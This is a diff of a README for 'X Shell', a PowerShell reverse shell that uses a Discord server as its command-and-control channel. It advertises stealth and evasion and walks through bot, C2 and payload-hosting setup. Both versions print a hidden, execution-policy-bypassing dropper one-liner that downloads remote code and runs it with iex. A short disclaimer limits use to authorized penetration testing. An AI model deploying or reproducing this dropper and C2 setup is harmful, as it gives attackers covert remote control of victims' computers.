@@ -1,55 +1,19 @@
-![banner](src/banner.png)
 # X Shell: Discord-Based Reverse Shell
-
-## 🚨 Disclaimer
-
-**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.
-
-## Quick Start Guide
-
-### Prerequisites
-- Discord server
-- Discord bot with channel management permissions
-- Vercel account for API deployment
-
-### 1. Create Discord Bot
-1. Visit [Discord Developer Portal](https://discord.com/developers/applications)
-2. Create new application
-3. Generate bot token
-4. Configure bot permissions:
-   - Manage Channels
-   - Read Messages
-   - Send Messages
-
-### 2. Deploy Backend API
-1. Fork the repository
-2. Deploy to Vercel
-3. Configure `index.js`:
-   - Set authentication tokens on lines 28-29
-   - Update PowerShell script serving on lines 31 and 36
-4. Note the generated Vercel URL
-
-### 3. Prepare Deployment
-1. Update the script with:
-   - Bot token (`$t`)
-   - Server ID (`$s`)
-   - Category ID (`$categoryID`)
-
-### 4. Execute Dropper
-```powershell
-powershell -W Hidden -Exec Bypass -c "$r = iwr https://xyz.vercel.app/ -H @{'Authorization'='Bearer xyzxyz'}; iex $r.Content"
-```
 
 ## Overview
 
 X Shell is a PowerShell-based reverse shell that leverages a Discord server as its command-and-control (C2) infrastructure. It dynamically creates dedicated Discord channels for each user, enabling organized command execution and response tracking.
+
+## 🚨 Disclaimer
+
+**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.
 
 ## Features
 
 - 🔒 Stealthy PowerShell dropper mechanism
 - 🤖 Discord-based command and control
 - 🔐 Dynamic channel creation for each session
-- 🌐 Remote script retrieval via API
+- 🌐 Flexible script retrieval mechanism
 
 ## Architecture
 
@@ -57,18 +21,73 @@ X Shell is a PowerShell-based reverse shell that leverages a Discord server as i
 
 1. **PowerShell Dropper**
    - Bypasses Windows execution restrictions
-   - Retrieves main script from remote API
+   - Retrieves main script from configurable source
    - Minimal footprint for evasion
 
-2. **Backend API**
-   - Authenticates and serves scripts
-   - Manages script deployment
-   - Provides secure script retrieval
+2. **Script Hosting** *(Optional but Recommended)*
+   - Can use Vercel, GitHub Gist, or other hosting
+   - Provides secure and fast script retrieval
+   - Enables easy script updates
 
 3. **Discord C2 Server**
    - Manages communication channels
    - Executes received PowerShell commands
    - Returns command output
+
+## Requirements
+
+- Discord server
+- Discord bot with channel management permissions
+- Hosting solution for script retrieval (optional)
+- PowerShell environment
+
+## Installation Steps
+
+### 1. Create Discord Bot
+- Visit [Discord Developer Portal](https://discord.com/developers/applications)
+- Create new application
+- Generate bot token
+- Configure permissions:
+  - Manage Channels
+  - Read Messages
+  - Send Messages
+
+### 2. Script Hosting *(Recommended)*
+**Option A: Vercel Deployment** (Recommended)
+- Fork repository
+- Deploy to Vercel
+- Configure authentication tokens
+- Update script serving logic
+
+**Option B: Alternative Hosting**
+- Use GitHub Gist
+- Private pastebin
+- Personal web server
+- Ensure secure, authenticated access
+
+### 3. Prepare Deployment
+- Update script with:
+  - Bot token
+  - Server ID
+  - Category ID
+  - Script retrieval URL
+
+### 4. Execute Dropper
+```powershell
+powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H @{'Authorization'='Bearer your-token'}; iex $r.Content"
+```
+
+## Hosting Considerations
+
+- Use HTTPS for script retrieval
+- Implement token-based authentication
+- Minimize script exposure
+- Regularly rotate access tokens
+
+## Additional Resources
+
+- [Discord Server Template](https://discord.new/AFkzNqmAdmex)
+- Preconfigured server with logging channels
 
 ## Security Considerations
 
@@ -84,15 +103,9 @@ X Shell is a PowerShell-based reverse shell that leverages a Discord server as i
 3. Commit changes
 4. Push and submit pull request
 
-## Additional Resources
-
-- [Discord Server Template](https://discord.new/AFkzNqmAdmex)
-- Preconfigured server with logging channels
-
 ## License
 
-[Specify your license here]
+
 
 ## Contact
 
-[Your contact information or support channels]
